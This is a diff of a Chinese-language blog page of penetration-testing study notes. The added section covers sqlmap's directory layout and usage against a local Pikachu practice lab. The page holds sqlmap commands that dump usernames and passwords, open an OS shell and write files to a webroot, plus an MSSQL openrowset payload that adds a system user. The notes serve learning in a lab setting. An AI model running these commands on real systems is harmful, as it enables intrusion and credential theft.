@@ -7,12 +7,12 @@
   
   <title>学习思考 | blog小窝</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="基础入门  Web 应用 Web 架构 web 架构相关内容 反弹 shell   信息打点  业务资产 WEB 单域名 WEB 子域名 Web 架构资产 源码泄露 JS 架构 端口 &amp; 蜜罐 &amp; WAF CDN 绕过   提权  后台权限 数据库权限  mysql 提权 MSSQL 提权">
+  <meta name="description" content="基础入门  Web 应用 Web 架构 web 架构相关内容 反弹 shell   信息打点  业务资产 WEB 单域名 WEB 子域名 Web 架构资产 源码泄露 JS 架构 端口 &amp; 蜜罐 &amp; WAF CDN 绕过   提权  后台权限 数据库权限  mysql 提权 MSSQL 提权     工具  sqlmap  目录内容梳理 一些常用功能特性">
 <meta property="og:type" content="article">
 <meta property="og:title" content="学习思考">
-<meta property="og:url" content="https://my011215.github.io/2023/08/12/Penetration%20testing/%E5%AD%A6%E4%B9%A0%E6%80%9D%E8%80%83/index.html">
+<meta property="og:url" content="https://my011215.github.io/2023/10/17/Penetration%20testing/%E5%AD%A6%E4%B9%A0%E6%80%9D%E8%80%83/index.html">
 <meta property="og:site_name" content="blog小窝">
-<meta property="og:description" content="基础入门  Web 应用 Web 架构 web 架构相关内容 反弹 shell   信息打点  业务资产 WEB 单域名 WEB 子域名 Web 架构资产 源码泄露 JS 架构 端口 &amp; 蜜罐 &amp; WAF CDN 绕过   提权  后台权限 数据库权限  mysql 提权 MSSQL 提权">
+<meta property="og:description" content="基础入门  Web 应用 Web 架构 web 架构相关内容 反弹 shell   信息打点  业务资产 WEB 单域名 WEB 子域名 Web 架构资产 源码泄露 JS 架构 端口 &amp; 蜜罐 &amp; WAF CDN 绕过   提权  后台权限 数据库权限  mysql 提权 MSSQL 提权     工具  sqlmap  目录内容梳理 一些常用功能特性">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/390.png?raw=true">
 <meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/391.png?raw=true">
@@ -21,8 +21,17 @@
 <meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/394.png?raw=true">
 <meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/395.png?raw=true">
 <meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/394.png?raw=true">
-<meta property="article:published_time" content="2023-08-12T03:12:30.000Z">
-<meta property="article:modified_time" content="2023-08-22T14:15:16.231Z">
+<meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/420.png?raw=true">
+<meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/422.png?raw=true">
+<meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/423.png?raw=true">
+<meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/424.png?raw=true">
+<meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/425.png?raw=true">
+<meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/426.png?raw=true">
+<meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/427.png?raw=true">
+<meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/428.png?raw=true">
+<meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/429.png?raw=true">
+<meta property="article:published_time" content="2023-10-17T03:12:30.000Z">
+<meta property="article:modified_time" content="2023-10-17T14:30:23.060Z">
 <meta property="article:author" content="草莓布丁">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/390.png?raw=true">
@@ -82,8 +91,8 @@
       <div class="outer">
         <section id="main"><article id="post-Penetration testing/学习思考" class="article article-type-post" itemscope itemprop="blogPost"> 
 <div class="article-meta">
-    <a href="/2023/08/12/Penetration%20testing/%E5%AD%A6%E4%B9%A0%E6%80%9D%E8%80%83/" class="article-date">
-  <time datetime="2023-08-12T03:12:30.000Z" itemprop="datePublished">2023-08-12</time>
+    <a href="/2023/10/17/Penetration%20testing/%E5%AD%A6%E4%B9%A0%E6%80%9D%E8%80%83/" class="article-date">
+  <time datetime="2023-10-17T03:12:30.000Z" itemprop="datePublished">2023-10-17</time>
 </a>
 
 
@@ -137,6 +146,16 @@
 <ul>
 <li><a href="#mysql%E6%8F%90%E6%9D%83">mysql 提权</a></li>
 <li><a href="#mssql%E6%8F%90%E6%9D%83">MSSQL 提权</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#%E5%B7%A5%E5%85%B7">工具</a>
+<ul>
+<li><a href="#sqlmap">sqlmap</a>
+<ul>
+<li><a href="#%E7%9B%AE%E5%BD%95%E5%86%85%E5%AE%B9%E6%A2%B3%E7%90%86">目录内容梳理</a></li>
+<li><a href="#%E4%B8%80%E4%BA%9B%E5%B8%B8%E7%94%A8%E5%8A%9F%E8%83%BD%E7%89%B9%E6%80%A7">一些常用功能特性</a></li>
 </ul>
 </li>
 </ul>
@@ -1054,12 +1073,165 @@ rport 默认 3306</p>
 <li>执行系统命令（增加系统用户）</li>
 </ul>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from openrowset(&#x27;microsoft.jet.oledb.4.0&#x27;,&#x27;;database=c:/windows/system32/ias/ias.mdb&#x27;,&#x27;select shell(&quot;net user margin margin /add&quot;)&#x27;) </span><br></pre></td></tr></table></figure>
-<p>d</p>
+<h2><span id="工具"> 工具</span></h2>
+<h3><span id="sqlmap"> sqlmap</span></h3>
+<h4><span id="目录内容梳理"> 目录内容梳理</span></h4>
+<p><img src="https://github.com/my011215/my011215.github.io/blob/main/image/420.png?raw=true" alt></p>
+<ol>
+<li>
+<p>D:\python\sqlmap\data\procs<br>
+ 四种数据库（mssql、mysql、oracal、poatgresql）的一些提权 sql 语句。</p>
+</li>
+<li>
+<p>D:\python\sqlmap\data\shell\backdoors<br>
+ 存放四种类型的 web_shell 文件（asp、jsp、php、aspx）</p>
+</li>
+<li>
+<p>D:\python\sqlmap\data\shell\stagers<br>
+ 个人感觉可以简单理解为 payload<br>
+Stagers 是一个小发射器（同样以火箭发射作比喻），旨在创建某种形式的通信，然后将执行传递到下一个阶段。使用 stager 解决了两个问题。首先，它允许我们最初使用较小的有效负载来加载具有更多功能的较大的 payload。其次，它使通信机制与最终阶段分离成为可能，因此一个 payload 无需复制代码就可以与多个传输一起使用。</p>
+</li>
+<li>
+<p>D:\python\sqlmap\data\txt<br>
+ 一些爆破的字典（表、列、数据、关键字等）</p>
+</li>
+<li>
+<p>D:\python\sqlmap\data\udf<br>
+ 顾名思义，UDF 提权（mysql、postgresql）</p>
+</li>
+<li>
+<p>D:\python\sqlmap\data\xml\banner<br>
+ 使用 xml 格式用来记录数据库、请求头、响应头的标志信息，会随着工具运行识别到后响应出来。</p>
+</li>
+<li>
+<p>D:\python\sqlmap\data\xml\payloads<br>
+ 使用 xml 格式用来记录六种 sql 注入类型的 payload</p>
+</li>
+</ol>
+<ul>
+<li>布尔型盲注（Boolean-based blind）</li>
+<li>时间型盲注（Time-based blind）</li>
+<li>报错型注入（Error-based）</li>
+<li>联合查询注入（UNION query-based）</li>
+<li>堆叠查询注入（Stacked queries）</li>
+<li>内联查询注入（Inline queries）</li>
+</ul>
+<ol start="8">
+<li>
+<p>D:\python\sqlmap\doc<br>
+ 各种语言的 Reademe 文档</p>
+</li>
+<li>
+<p>D:\python\sqlmap\extra\beep<br>
+ 发出声音的 python 脚本</p>
+</li>
+<li>
+<p>D:\python\sqlmap\extra\cloak<br>
+ 对文件进行特殊处理，可以生成加密和压缩的二进制后门文件，也可以反过来进行还原。</p>
+</li>
+<li>
+<p>D:\python\sqlmap\extra\dbgtool<br>
+ 一个可执行文件转换为 ASCII 调试脚本<br>
+可执行文件可以是各种不同的二进制文件格式，如 Windows 的.exe 文件、Linux 的 ELF 文件、macOS 的 Mach-O 文件等。<br>
+将可执行文件转换成 ASCII 的目的是为了将二进制文件转换成人类可读的文本形式。这样做的好处是可以方便地查看和分析可执行文件的内容。ASCII 调试脚本可以以文本形式打印出来，便于阅读和理解。<br>
+然而，转换成 ASCII 并不是为了提高可执行文件的阅读性，而是为了提供给调试工具或分析工具使用。调试工具可以使用 ASCII 调试脚本对可执行文件进行调试和分析，以便识别和修复其中的问题。所以，转换成 ASCII 便于调试和分析，而不仅仅是为了提高可读性。对于普通用户来说，直接阅读可执行文件的 ASCII 调试脚本可能并不容易理解。</p>
+</li>
+<li>
+<p>D:\python\sqlmap\extra\icmpsh<br>
+ 在内网中，如果攻击者使用 HTTP、DNS 等应用层隧道都失败了，那么或许可以试试网络层的 ICMP 隧道，ICMP 协议最常见的场景就是使用 ping 命令，而且一般防火墙都不会禁止 ping 数据包。</p>
+</li>
+<li>
+<p>D:\python\sqlmap\extra\runcmd<br>
+cmd 运行程序</p>
+</li>
+<li>
+<p>D:\python\sqlmap\extra\vulnserver<br>
+sql 注入漏洞检测逻辑设计</p>
+</li>
+<li>
+<p>D:\python\sqlmap\plugins<br>
+sqlmap 自带的功能检测插件</p>
+</li>
+<li>
+<p>D:\python\sqlmap\tamper<br>
+ 一些对数据进行处理的 python 脚本，比如进行 base64 编码，也可以自己写脚本跑。</p>
+</li>
+<li>
+<p>D:\python\sqlmap\thirdparty<br>
+ 一些 python 第三方包</p>
+</li>
+</ol>
+<h4><span id="一些常用功能特性"> 一些常用功能特性</span></h4>
+<ol>
+<li>支持用户提供单个目标 URL，通过 Burp proxy 或 WebScarab proxy 的请求日志文件批量获取目标地址列表，从文本文件获得完整的 HTTP 请求报文或使用 Google dork—— 使用 Google 查询并解析结果页面获取批量目标。也可以自定义正则表达式进行验证解析</li>
+</ol>
+<figure class="highlight python"><figcaption><span>sqlmap.py -u "http://x.x.x.x/pikachu/vul/sqli/sqli_str.php?name</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line">![](https://github.com/my011215/my011215.github.io/blob/main/image/<span class="number">421.</span>png?raw=true)    </span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> 支持设置输出信息的详细级别：共有七个级别的详细程度  </span><br><span class="line">-v  <span class="comment">#详细的等级(0-6) </span></span><br></pre></td></tr></table></figure>
+<p>0：只显示 Python 的回溯，错误和关键消息。<br>
+1：显示信息和警告消息。<br>
+2：显示调试消息。<br>
+3：有效载荷注入。<br>
+4：显示 HTTP 请求。<br>
+5：显示 HTTP 响应头。<br>
+6：显示 HTTP 响应页面的内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/pikachu/vul/sqli/sqli_str.php?name=111&amp;submit=%E6%9F%A5%E8%AF%A2&quot; -v 4</span><br></pre></td></tr></table></figure>
+<p><img src="https://github.com/my011215/my011215.github.io/blob/main/image/422.png?raw=true" alt><br>
+3. 在抓取数据时能实时自动保存会话（对应查询和输出结果，支持部分获取保存）到一个文本文件中，并通过解析会话文件继续当前进行的注入检测。<br>
+<img src="https://github.com/my011215/my011215.github.io/blob/main/image/423.png?raw=true" alt><br>
+<img src="https://github.com/my011215/my011215.github.io/blob/main/image/424.png?raw=true" alt><br>
+4. 支持枚举用户，密码散列，权限，角色，数据库，数据表和数据列。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">--current-db</span><br><span class="line">--tables -D &quot;&quot;</span><br><span class="line">--columns -T &quot;&quot; -D &quot;&quot;</span><br><span class="line">--dump -C &quot;&quot; -T &quot;&quot; -D &quot;&quot;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>当前数据库</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/pikachu/vul/sqli/sqli_str.php?name=111&amp;submit=%E6%9F%A5%E8%AF%A2&quot; --current-db</span><br></pre></td></tr></table></figure>
+<p><img src="https://github.com/my011215/my011215.github.io/blob/main/image/425.png?raw=true" alt></p>
+<ul>
+<li>在指定数据库下的表</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/pikachu/vul/sqli/sqli_str.php?name=111&amp;submit=%E6%9F%A5%E8%AF%A2&quot; --tables -D &quot;pikachu&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="https://github.com/my011215/my011215.github.io/blob/main/image/426.png?raw=true" alt></p>
+<ul>
+<li>在指定数据库下指定表的字段</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/pikachu/vul/sqli/sqli_str.php?name=111&amp;submit=%E6%9F%A5%E8%AF%A2&quot; --columns -T &quot;users&quot; -D &quot;pikachu&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="https://github.com/my011215/my011215.github.io/blob/main/image/427.png?raw=true" alt></p>
+<ul>
+<li>在指定数据库指定表指定字段的数据值</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/pikachu/vul/sqli/sqli_str.php?name=111&amp;submit=%E6%9F%A5%E8%AF%A2&quot; --dump -C &quot;username,password&quot; -T &quot;users&quot; -D &quot;pikachu&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="https://github.com/my011215/my011215.github.io/blob/main/image/428.png?raw=true" alt></p>
+<ol start="5">
+<li>MYSQL 高权限注入</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">引出权限：</span><br><span class="line">--is-dba --privileges</span><br><span class="line">引出文件：</span><br><span class="line">--file-read --file-write --file-dest </span><br><span class="line">--file-write /test/test.txt --file-dest /var/www/html/1.txt;将本地的test.txt文件写入到目标的1.txt</span><br><span class="line">引出命令：</span><br><span class="line">--os-cmd=id    #执行系统命令 </span><br><span class="line">--os-shell     #系统交互shell</span><br><span class="line">--sql-shell    #执行指定sql命令</span><br></pre></td></tr></table></figure>
+<p>这个判断也不是很准<br>
+<img src="https://github.com/my011215/my011215.github.io/blob/main/image/429.png?raw=true" alt><br>
+ 6. 支持不同类型提交</p>
+<ul>
+<li>get 提交</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/pikachu/vul/sqli/sqli_str.php?name=111&amp;submit=%E6%9F%A5%E8%AF%A2&quot;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>post 提交</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/pikachu/vul/sqli/sqli_str.php&quot; --data &quot;id=1&amp;name=user&quot;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>设置特定 cookie 值</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/pikachu/vul/sqli/sqli_str.php&quot; --cookie &quot;PHPSESSID=50ch5eppo4v9d9epud4upv6n17&quot;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>使用请求的数据包（可以使用 burp 进行保存）进行自动注入，可以在可以注入点位置加入星号</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/pikachu/vul/sqli/sqli_str.php&quot; -r 1.txt</span><br></pre></td></tr></table></figure>
+<ol start="7">
+<li>使用 Tamper 自定义脚本绕过</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/pikachu/vul/sqli/sqli_str.php&quot; --tamper=base64encode.py</span><br></pre></td></tr></table></figure>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://my011215.github.io/2023/08/12/Penetration%20testing/%E5%AD%A6%E4%B9%A0%E6%80%9D%E8%80%83/" data-id="cli2xd5rx0000g8tn92wf64l6" class="article-share-link">Share</a>
+      <a data-url="https://my011215.github.io/2023/10/17/Penetration%20testing/%E5%AD%A6%E4%B9%A0%E6%80%9D%E8%80%83/" data-id="cli2xd5rx0000g8tn92wf64l6" class="article-share-link">Share</a>
       
       
     </footer>
@@ -1068,19 +1240,10 @@ rport 默认 3306</p>
     
 <nav id="article-nav">
   
-    <a href="/2023/09/10/Penetration%20testing/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Newer</strong>
-      <div class="article-nav-title">
-        
-          vulnhub靶机学习记录
-        
-      </div>
-    </a>
   
-  
-    <a href="/2023/05/14/learning%20share/%E8%B4%A7%E8%BF%90%E7%89%A9%E6%B5%81%E8%A1%A8%E7%94%9F%E6%88%90/" id="article-nav-older" class="article-nav-link-wrap">
+    <a href="/2023/09/10/Penetration%20testing/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" id="article-nav-older" class="article-nav-link-wrap">
       <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">货运物流表生成</div>
+      <div class="article-nav-title">vulnhub靶机学习记录</div>
     </a>
   
 </nav>
@@ -1112,7 +1275,7 @@ rport 默认 3306</p>
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/09/">September 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/08/">August 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">April 2023</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">March 2023</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/02/">February 2023</a><span class="archive-list-count">10</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/01/">January 2023</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/12/">December 2022</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/11/">November 2022</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/10/">October 2022</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/09/">September 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">July 2022</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/06/">June 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/05/">May 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">April 2022</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">March 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2001/12/">December 2001</a><span class="archive-list-count">1</span></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/10/">October 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/09/">September 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">April 2023</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">March 2023</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/02/">February 2023</a><span class="archive-list-count">10</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/01/">January 2023</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/12/">December 2022</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/11/">November 2022</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/10/">October 2022</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/09/">September 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">July 2022</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/06/">June 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/05/">May 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">April 2022</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">March 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2001/12/">December 2001</a><span class="archive-list-count">1</span></li></ul>
     </div>
   </div>
 
@@ -1125,11 +1288,11 @@ rport 默认 3306</p>
       <ul>
         
           <li>
-            <a href="/2023/09/10/Penetration%20testing/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">vulnhub靶机学习记录</a>
+            <a href="/2023/10/17/Penetration%20testing/%E5%AD%A6%E4%B9%A0%E6%80%9D%E8%80%83/">学习思考</a>
           </li>
         
           <li>
-            <a href="/2023/08/12/Penetration%20testing/%E5%AD%A6%E4%B9%A0%E6%80%9D%E8%80%83/">学习思考</a>
+            <a href="/2023/09/10/Penetration%20testing/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">vulnhub靶机学习记录</a>
           </li>
         
           <li>
